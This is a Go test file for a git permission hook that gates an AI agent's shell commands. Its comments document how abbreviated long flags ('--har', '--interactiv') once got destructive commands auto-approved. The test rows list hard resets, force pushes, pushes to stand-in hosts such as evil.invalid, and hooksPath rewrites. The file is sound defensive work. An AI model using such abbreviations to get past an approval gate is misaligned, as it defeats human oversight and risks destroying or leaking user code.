package git

import (
	"go/ast"
	"go/parser"
	"go/token"
	"strings"
	"testing"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
)

// LONG-FLAG ABBREVIATION TESTS (pg2-os1kq).
//
// git's parse-options accepts any UNAMBIGUOUS PREFIX of a long option, so an
// EXACT-TOKEN long-flag test is bypassable by shortening the flag by one character,
// and the bypass direction is toward Approve. Measured on a binary built from main @
// 9c52f66b, 2026-07-30: `git reset --har HEAD~1` / `--ha` / `--h` all answered
// `allow`, each with the reason `git:modifying: git reset (soft) is safe` — so a HARD
// reset (measured PERFORMED by real git for all three spellings) was approved with a
// message asserting it was soft. `git rebase --interactiv` / `--intera` / `--int` /
// `--in` likewise answered `allow`, skipping the editor requirement.
//
// The tests below come in three layers, on purpose:
//
//  1. BEHAVIOURAL, per gated flag — generate every `--`-prefixed prefix of the
//     canonical name and assert the verdict. This is what actually pins the fix.
//  2. THE MECHANICAL GUARD — walk this package's git.go AST and fail any exact-token
//     long-flag test outside a named exemption, so a future author cannot silently
//     reintroduce the class. Layer 1 alone cannot do that: it only knows the flags
//     someone remembered to list.
//  3. REGRESSION — the sibling beads' verdicts, re-pinned against the wider matcher.

// evalCmd is the shared "ask the rule about one command string" helper.
func evalCmd(t *testing.T, cmd string) hookio.RuleResult {
	t.Helper()
	return New(nil).Evaluate(&hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": cmd}),
	})
}

// longFlagSpellings returns every spelling of canonical that git's parse-options
// could accept — the full name and every non-empty `--`-prefixed prefix of it.
// Shorter prefixes real git rejects as AMBIGUOUS are included deliberately: the
// matcher over-matches on purpose (cmdparse.HasLongFlagPrefix documents why that is
// the fail-safe direction), so the gate MUST hold for those too.
func longFlagSpellings(canonical string) []string {
	out := make([]string, 0, len(canonical))
	for n := 1; n <= len(canonical); n++ {
		out = append(out, "--"+canonical[:n])
	}
	return out
}

// TestGit_ResetHardAbbrev_NeverApprovedNorCalledSoft pins the severe half of
// pg2-os1kq. Two claims, and the second is the one that made this worse than a
// missing prompt: no `--hard` spelling may Approve, AND no verdict for one may carry
// a reason asserting the reset is soft — before the fix `--har` was approved with
// exactly that reason, so every later reader of the asklog saw a soft reset.
func TestGit_ResetHardAbbrev_NeverApprovedNorCalledSoft(t *testing.T) {
	for _, flag := range longFlagSpellings("hard") {
		cmd := "git reset " + flag + " HEAD~1"
		got := evalCmd(t, cmd)
		if got.Decision != hookio.Ask {
			t.Errorf("cmd %q: got %s (%s), want ask — real git PERFORMS the hard reset for --hard/--har/--ha/--h (measured git 2.54.0, 2026-07-30)", cmd, got.Decision, got.Reason)
		}
		if strings.Contains(strings.ToLower(got.Reason), "soft") {
			t.Errorf("cmd %q: reason %q claims the reset is soft — it is a HARD reset", cmd, got.Reason)
		}
	}
	// `--hard=x` is rejected by real git ("option `hard' takes no value"), so gating
	// it costs nothing and matching the glued form keeps the matcher uniform.
	if got := evalCmd(t, "git reset --har=x HEAD~1"); got.Decision != hookio.Ask {
		t.Errorf("git reset --har=x: got %s, want ask", got.Decision)
	}
}

// TestGit_RebaseInteractiveAbbrev_EditorRequired pins that every `--interactive`
// spelling is subject to the editor requirement, and that supplying the automated
// editor still makes each of them approvable — the requirement must not become a
// blanket refusal.
func TestGit_RebaseInteractiveAbbrev_EditorRequired(t *testing.T) {
	for _, flag := range longFlagSpellings("interactive") {
		bare := "git rebase " + flag + " HEAD~1"
		if got := evalCmd(t, bare); got.Decision != hookio.Abstain {
			t.Errorf("cmd %q: got %s (%s), want abstain (interactive rebase requires an editor)", bare, got.Decision, got.Reason)
		}
		withEditor := `GIT_SEQUENCE_EDITOR="sed -i 's/^pick /fixup /'" git rebase ` + flag + " HEAD~1"
		if got := evalCmd(t, withEditor); got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want approve (the editor requirement is satisfied)", withEditor, got.Decision, got.Reason)
		}
	}
}

// TestGit_ForceWithLeaseAbbrev_SameCrossBranchCheck pins that every
// `--force-with-lease` spelling is routed through the SAME cross-branch check as the
// full spelling: cross-branch Rejects, same-branch-to-origin Approves, a non-origin
// named remote Asks, and a URL destination Rejects (the pg2-abb65 ordering).
//
// NOTE ON THE BEAD'S PREMISE, recorded because it is a finding: this half was
// ALREADY closed before pg2-os1kq. pg2-bohpm matched the flag with a measured
// minimum of len("force-w"), and re-measured on git 2.54.0, 2026-07-30, `--force-`
// and every shorter prefix is `error: ambiguous option` — so every spelling git
// accepts was already covered, and `git push --force-with-leas origin main:other`
// already answered `deny` on main @ 9c52f66b. The bead's `--force-with-leas origin
// main` row read `allow` because SAME-BRANCH-to-origin is approvable in the FULL
// spelling too, not because the abbreviation bypassed anything. What pg2-os1kq
// changes here is the removal of the measured bound, so the gate no longer depends on
// --force-if-includes continuing to exist.
func TestGit_ForceWithLeaseAbbrev_SameCrossBranchCheck(t *testing.T) {
	for _, flag := range longFlagSpellings("force-with-lease") {
		// A prefix at or below len("force") is also a prefix of `force`, which is the
		// blanket force-push Reject — a stricter verdict for the same operation, and
		// the correct one, so those spellings are asserted as Reject throughout.
		alsoPlainForce := len(flag)-2 <= len("force")

		cross := "git push " + flag + " origin main:other"
		if got := evalCmd(t, cross); got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s (%s), want deny (cross-branch lease)", cross, got.Decision, got.Reason)
		}

		same := "git push " + flag + " origin main"
		wantSame := hookio.Approve
		if alsoPlainForce {
			wantSame = hookio.Reject
		}
		if got := evalCmd(t, same); got.Decision != wantSame {
			t.Errorf("cmd %q: got %s (%s), want %s", same, got.Decision, got.Reason, wantSame)
		}

		nonOrigin := "git push " + flag + " upstream main"
		wantNonOrigin := hookio.Ask
		if alsoPlainForce {
			wantNonOrigin = hookio.Reject
		}
		if got := evalCmd(t, nonOrigin); got.Decision != wantNonOrigin {
			t.Errorf("cmd %q: got %s (%s), want %s", nonOrigin, got.Decision, got.Reason, wantNonOrigin)
		}

		url := "git push " + flag + " https://example.invalid/x.git main"
		if got := evalCmd(t, url); got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s (%s), want deny (network destination)", url, got.Decision, got.Reason)
		}
	}
	// The `=`-glued lease VALUE is still deliberately not read: the colon in
	// `--force-with-lease=<ref>:<oid>` separates the ref from the expected object id,
	// so this is a SAME-branch push carrying an explicit lease.
	if got := evalCmd(t, "git push --force-with-lea=main:abc123 origin main"); got.Decision != hookio.Approve {
		t.Errorf("abbreviated glued same-branch lease: got %s (%s), want allow", got.Decision, got.Reason)
	}
}

// TestGit_PushForceMirrorDeleteAbbrev_Reject pins the pg2-bohpm Rejects across every
// spelling. These verdicts do not change for any spelling git accepts; the open
// matcher additionally refuses the shorter prefixes git currently calls ambiguous,
// which is the fail-safe direction and removes the dependency on git's option table.
func TestGit_PushForceMirrorDeleteAbbrev_Reject(t *testing.T) {
	cases := []struct{ canonical, tail string }{
		{"force", "origin main"},
		{"mirror", "origin"},
		{"delete", "origin main"},
	}
	for _, c := range cases {
		for _, flag := range longFlagSpellings(c.canonical) {
			cmd := "git push " + flag + " " + c.tail
			if got := evalCmd(t, cmd); got.Decision != hookio.Reject {
				t.Errorf("cmd %q: got %s (%s), want deny", cmd, got.Decision, got.Reason)
			}
		}
	}
	// A LONGER flag must NOT collapse into a shorter canonical's gate: these keep
	// their own verdicts rather than reading as `--force` / `--delete`.
	for _, cmd := range []string{
		"git push --force-with-lease origin main", // same-branch lease: approvable
		"git push --dry-run origin main",          // not --delete
	} {
		if got := evalCmd(t, cmd); got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want allow — a longer flag must not match a shorter canonical", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_LongFlagAbbrev_RespectsEndOfOptions pins the `--` terminator across the
// three gates: after it a `--`-prefixed token is an OPERAND (a pathspec, a ref),
// which is how git reads it and how HasShortFlag / HasLongFlag already behave.
//
// This LOOSENS three verdicts relative to main @ 9c52f66b, deliberately and as the
// acceptance criteria require: the old exact-token hasFlag ignored the terminator, so
// `git reset -- --hard` answered `ask` for a command that resets nothing but a
// pathspec literally named `--hard`.
func TestGit_LongFlagAbbrev_RespectsEndOfOptions(t *testing.T) {
	for _, cmd := range []string{
		"git reset -- --hard",
		"git reset -- --har",
		"git reset -- --h",
		"git rebase -- --interactiv",
		"git push origin main -- --force-w",
		"git push origin main -- --force",
	} {
		if got := evalCmd(t, cmd); got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want allow — a token after `--` is an operand, not a flag", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_NonHardResetSpellings_Unchanged guards the other direction: widening the
// `--hard` test must not drag in the reset modes that are NOT `--hard`. `--h` is the
// shortest spelling of `--hard` and is gated; `--s`/`--m`/`--k` are other modes and
// keep their Approve.
func TestGit_NonHardResetSpellings_Unchanged(t *testing.T) {
	for _, cmd := range []string{
		"git reset HEAD~1",
		"git reset --soft HEAD~1",
		"git reset --mixed HEAD~1",
		"git reset --keep HEAD~1",
		"git reset --merge HEAD~1",
		"git reset --no-hard HEAD~1", // a negation is not the flag
	} {
		if got := evalCmd(t, cmd); got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want allow (not a --hard spelling)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_Pg2os1kq_PinnedProbeRows pins every command VERBATIM from the bead's
// measured "CETA approves them" block — including its double spacing — with the
// corrected expected verdict, so the exact reproduction can never come back. The
// measurements are from a binary built from main @ 9c52f66b with
// permission_mode "default"; scripts/probe-pg2-os1kq.sh reproduces them.
//
// ONE ROW'S RECORDED ANNOTATION IS WRONG AND THE CORRECTION IS PINNED HERE. The bead
// reads `git push --force-with-leas origin main -> ALLOW <-- skips the cross-branch
// refspec check`. It does not: `allow` is the CORRECT verdict for that command,
// because a SAME-BRANCH --force-with-lease to origin is the post-rebase idiom
// pushVerdict deliberately approves, and the FULL spelling `git push
// --force-with-lease origin main` answered `allow` on the same binary. The
// cross-branch form of the abbreviation, `--force-with-leas origin main:other`,
// already answered `deny` before this bead — pg2-bohpm had matched the flag down to
// its measured minimum len("force-w"), and git refuses `--force-` and shorter as
// ambiguous. So the push half of this bead was already closed; what changed here is
// that the bound is gone, not the verdict.
func TestGit_Pg2os1kq_PinnedProbeRows(t *testing.T) {
	rows := []struct {
		cmd  string
		want hookio.Decision
		note string
	}{
		{"git reset --hard HEAD~1", hookio.Ask, "was already correct"},
		{"git reset --har  HEAD~1", hookio.Ask, "was ALLOW — destroys the working tree"},
		{"git reset --ha   HEAD~1", hookio.Ask, "was ALLOW — destroys the working tree"},
		{"git reset --h    HEAD~1", hookio.Ask, "was ALLOW — the shortest accepted spelling"},
		{"git push --force origin main", hookio.Reject, "was already correct"},
		{"git push --force-with-leas origin main", hookio.Approve, "allow is CORRECT: same-branch lease to origin"},
		{"git push --force-with-leas origin main:other", hookio.Reject, "cross-branch: already denied before this bead"},
		{"git rebase --interactiv", hookio.Abstain, "was ALLOW — skipped the editor requirement"},
	}
	for _, row := range rows {
		got := evalCmd(t, row.cmd)
		if got.Decision != row.want {
			t.Errorf("pinned row %q: got %s (%s), want %s [%s]", row.cmd, got.Decision, got.Reason, row.want, row.note)
		}
	}
}

// TestGit_SiblingBeadVerdicts_Unchanged re-pins one representative verdict from each
// of the five beads that landed in this file in the 24 hours before pg2-os1kq, since
// widening the long-flag matchers is exactly the kind of change that could move one
// of them without any of their own tests noticing.
func TestGit_SiblingBeadVerdicts_Unchanged(t *testing.T) {
	rows := []struct {
		bead, cmd string
		want      hookio.Decision
	}{
		{"pg2-bohpm force-push, long", "git push --force origin main", hookio.Reject},
		{"pg2-bohpm force-push, short", "git push -f origin main", hookio.Reject},
		{"pg2-bohpm force-push, cluster", "git push -fu origin main", hookio.Reject},
		{"pg2-bohpm force-push, refspec", "git push origin +main", hookio.Reject},
		{"pg2-bohpm remote-ref delete, flag", "git push --delete origin main", hookio.Reject},
		{"pg2-bohpm remote-ref delete, refspec", "git push origin :main", hookio.Reject},
		{"pg2-bohpm --mirror", "git push --mirror origin", hookio.Reject},
		{"pg2-bohpm cross-branch lease", "git push --force-with-lease origin main:other", hookio.Reject},
		{"pg2-bohpm same-branch lease", "git push --force-with-lease origin main", hookio.Approve},
		{"pg2-abb65 push to network URL", "git push https://example.invalid/x.git main", hookio.Reject},
		{"pg2-abb65 push to scp-like URL", "git push git@example.invalid:evil/x.git main", hookio.Reject},
		{"pg2-abb65 push to local path", "git push /tmp/dst.git main", hookio.Approve},
		{"pg2-abb65 --repo=<url>", "git push --repo=https://example.invalid/x.git main", hookio.Reject},
		{"pg2-8imjo git remote -v add", "git remote -v add upstream https://example.invalid/x.git", hookio.Reject},
		{"pg2-8imjo read-only git remote", "git remote -v", hookio.Approve},
		{"pg2-szadj core.hooksPath write", "git config core.hooksPath /tmp/h", hookio.Ask},
		{"pg2-szadj remote.origin.url write", "git config remote.origin.url https://evil.invalid/x.git", hookio.Reject},
		{"pg2-szadj config read", "git config --get user.email", hookio.Approve},
		{"pg2-szadj ordinary config write", "git config x y", hookio.Approve},
		{"pg2-szadj config read behind -f", "git config -f .git/config --get core.fsmonitor", hookio.Approve},
		{"pg2-szadj --unset of a gated key", "git config --unset clean.requireForce", hookio.Ask},
		{"pg2-szadj git config set form", "git config set core.hooksPath /tmp/h", hookio.Ask},
		{"pg2-u0e0c git clean stays a flag-blind ask", "git clean", hookio.Ask},
		{"pg2-u0e0c git clean -fdx", "git clean -fdx", hookio.Ask},
		{"pg2-u0e0c git clean --f", "git clean --f", hookio.Ask},
		{"pre-pg2-bohpm branch -D", "git branch -D feat", hookio.Ask},
	}
	for _, row := range rows {
		if got := evalCmd(t, row.cmd); got.Decision != row.want {
			t.Errorf("%s: cmd %q got %s (%s), want %s — a sibling bead's verdict moved", row.bead, row.cmd, got.Decision, got.Reason, row.want)
		}
	}
}

// ---------------------------------------------------------------------------
// LAYER 2 — THE MECHANICAL GUARD
// ---------------------------------------------------------------------------

// exactTokenExemption names a function in git.go that MAY test a long flag by exact
// token, with the measured reason it is allowed to. The exemptions live HERE, in the
// test, rather than as markers in the source, so that adding one is a reviewable
// change to the guard itself.
type exactTokenExemption struct {
	fn        string
	mechanism string
	reason    string
}

// exactTokenExemptions is the complete list. Both entries are measured, not asserted.
var exactTokenExemptions = []exactTokenExemption{
	{
		fn:        "hasAbbrevLongFlag",
		mechanism: "cmdparse.HasLongFlag",
		reason: "this IS the bounded-abbreviation helper: it asks cmdparse.HasLongFlag once per " +
			"candidate spelling, longest first, so the exact-token call is the primitive it is built from",
	},
	{
		fn:        "hasGitConfigInjection",
		mechanism: "*",
		reason: "PRE-SUBCOMMAND options are parsed by git's own handle_options(), NOT by parse-options, " +
			"and it accepts NO abbreviation. Measured git 2.54.0, 2026-07-30: `git --git-di=<dir> log`, " +
			"`git --git=<dir> log`, `git --work-tre=<dir> log`, `git --namespac=<ns> log` and " +
			"`git --config-en=X=Y log` each answered `unknown option: …` while every full spelling " +
			"worked, so the exact-token test IS git's own parse and there is no bypass to close",
	},
}

func isExempt(fn, mechanism string) (string, bool) {
	for _, e := range exactTokenExemptions {
		if e.fn == fn && (e.mechanism == "*" || e.mechanism == mechanism) {
			return e.reason, true
		}
	}
	return "", false
}

// isLongFlagLit reports whether a Go expression is a string literal naming a long
// flag — `"--something"`. The bare end-of-options terminator `"--"` is NOT one, and
// neither is a short flag (`"-e"`, `"-D"`) or the `"-"` prefix probe.
func isLongFlagLit(e ast.Expr) (string, bool) {
	lit, ok := e.(*ast.BasicLit)
	if !ok || lit.Kind != token.STRING {
		return "", false
	}
	v := strings.Trim(lit.Value, "`\"")
	if len(v) <= 2 || !strings.HasPrefix(v, "--") {
		return "", false
	}
	return v, true
}

func selectorName(e ast.Expr) string {
	switch f := e.(type) {
	case *ast.Ident:
		return f.Name
	case *ast.SelectorExpr:
		if x, ok := f.X.(*ast.Ident); ok {
			return x.Name + "." + f.Sel.Name
		}
		return f.Sel.Name
	}
	return ""
}

// TestGit_LongFlagTests_AreAbbreviationAware is the mechanical guard required by
// pg2-os1kq: it walks git.go's AST and fails any EXACT-TOKEN long-flag test outside
// the exemptions above, so a future author cannot silently reintroduce the class that
// approved `git reset --har`.
//
// It is an AST walk rather than a line regex on purpose: the offending mechanisms
// have to be attributed to the ENCLOSING FUNCTION for the exemptions to mean
// anything, and a line-based scan cannot do that. Failures name file:line and the
// literal so they are actionable.
//
// The mechanisms it recognises are every way this file could test a long flag by
// exact token: `hasFlag(args, "--x")`, a direct `cmdparse.HasLongFlag` call (the
// exact-token primitive), `==` / `!=` against a `"--x"` literal, a `case "--x"`, and
// `strings.HasPrefix(tok, "--x")`.
func TestGit_LongFlagTests_AreAbbreviationAware(t *testing.T) {
	fset := token.NewFileSet()
	file, err := parser.ParseFile(fset, "git.go", nil, parser.ParseComments)
	if err != nil {
		t.Fatalf("parse git.go: %v", err)
	}

	report := func(fn, mechanism, lit string, pos token.Pos) {
		if reason, ok := isExempt(fn, mechanism); ok {
			t.Logf("exempt: %s in %s (%s) — %s", mechanism, fn, lit, reason)
			return
		}
		t.Errorf("%s: EXACT-TOKEN long-flag test %s on %s inside %s()\n"+
			"    git's parse-options accepts any unambiguous PREFIX of a long option, so this is "+
			"bypassable by shortening the flag by one character, toward Approve (pg2-os1kq).\n"+
			"    Use cmdparse.HasLongFlagPrefix for a boolean dangerous-flag test, or "+
			"hasAbbrevLongFlag with a MEASURED minimum where the match length or the flag's value "+
			"is load-bearing. See hasAbbrevLongFlag's doc for the rule.\n"+
			"    If the exact token is deliberate, add an entry to exactTokenExemptions with the "+
			"measurement that justifies it.",
			fset.Position(pos), mechanism, lit, fn)
	}

	for _, decl := range file.Decls {
		fd, ok := decl.(*ast.FuncDecl)
		if !ok || fd.Body == nil {
			continue
		}
		fn := fd.Name.Name
		ast.Inspect(fd.Body, func(n ast.Node) bool {
			switch node := n.(type) {
			case *ast.CallExpr:
				callee := selectorName(node.Fun)
				switch {
				case callee == "cmdparse.HasLongFlag":
					report(fn, "cmdparse.HasLongFlag", "(exact-token primitive)", node.Pos())
				case callee == "hasFlag", callee == "strings.HasPrefix", callee == "strings.EqualFold":
					for _, arg := range node.Args {
						if lit, ok := isLongFlagLit(arg); ok {
							report(fn, callee, lit, node.Pos())
						}
					}
				}
			case *ast.BinaryExpr:
				if node.Op != token.EQL && node.Op != token.NEQ {
					return true
				}
				for _, side := range []ast.Expr{node.X, node.Y} {
					if lit, ok := isLongFlagLit(side); ok {
						report(fn, node.Op.String(), lit, node.Pos())
					}
				}
			case *ast.CaseClause:
				for _, e := range node.List {
					if lit, ok := isLongFlagLit(e); ok {
						report(fn, "case", lit, node.Pos())
					}
				}
			}
			return true
		})
	}
}

// TestGit_GatedLongFlags_UseTheChosenMatcher is the POSITIVE half of the guard: the
// negative walk above proves nothing tests a long flag by exact token, but it cannot
// notice a gate that was DELETED. This enumerates the long flags the git rule gates
// and pins each to the matcher hasAbbrevLongFlag's doc says it must use, so deleting
// a gate or quietly swapping its matcher fails here.
func TestGit_GatedLongFlags_UseTheChosenMatcher(t *testing.T) {
	// wantOpenPrefix: BOOLEAN dangerous-flag tests. Over-matching only makes the
	// verdict stricter, so these MUST use the unbounded cmdparse.HasLongFlagPrefix.
	wantOpenPrefix := []string{"hard", "interactive", "force", "mirror", "delete", "force-with-lease"}
	// wantMeasuredMinimum: the match's VALUE is read (`--repo=<url>` becomes the push
	// destination the gate rules on), so an over-match would attribute a value to a
	// flag git never parsed. MUST keep a measured minimum.
	wantMeasuredMinimum := []string{"repo"}

	fset := token.NewFileSet()
	file, err := parser.ParseFile(fset, "git.go", nil, 0)
	if err != nil {
		t.Fatalf("parse git.go: %v", err)
	}

	openPrefix := map[string]bool{}
	measured := map[string]bool{}
	ast.Inspect(file, func(n ast.Node) bool {
		call, ok := n.(*ast.CallExpr)
		if !ok || len(call.Args) < 2 {
			return true
		}
		lit, ok := call.Args[1].(*ast.BasicLit)
		if !ok || lit.Kind != token.STRING {
			return true
		}
		name := strings.Trim(lit.Value, "`\"")
		switch selectorName(call.Fun) {
		case "cmdparse.HasLongFlagPrefix":
			openPrefix[name] = true
		case "hasAbbrevLongFlag":
			measured[name] = true
		}
		return true
	})

	for _, flag := range wantOpenPrefix {
		if !openPrefix[flag] {
			t.Errorf("long flag %q is not tested with cmdparse.HasLongFlagPrefix in git.go — it is a boolean dangerous-flag test, so the OPEN prefix matcher is required (pg2-os1kq); was the gate deleted or its matcher swapped?", flag)
		}
	}
	for _, flag := range wantMeasuredMinimum {
		if !measured[flag] {
			t.Errorf("long flag %q is not tested with hasAbbrevLongFlag in git.go — its `=`-glued VALUE is load-bearing, so a MEASURED minimum is required and the open prefix matcher MUST NOT be used (pg2-os1kq)", flag)
		}
		if openPrefix[flag] {
			t.Errorf("long flag %q is tested with cmdparse.HasLongFlagPrefix — over-matching has no safe direction where the flag's value is read; use hasAbbrevLongFlag with a measured minimum (pg2-os1kq)", flag)
		}
	}
	// `git config`'s options must NOT move to the open matcher: a match there ELIDES
	// a token and so shifts the operand count configIsRead's read/write bound and
	// gatedConfigKey's key scan both depend on.
	for flag := range configWriteFlags {
		if openPrefix[flag] {
			t.Errorf("`git config` option %q is tested with cmdparse.HasLongFlagPrefix — a config-option match shifts the operand count, so an over-match could change a git config verdict; keep the measured minimum (pg2-os1kq)", flag)
		}
	}
}
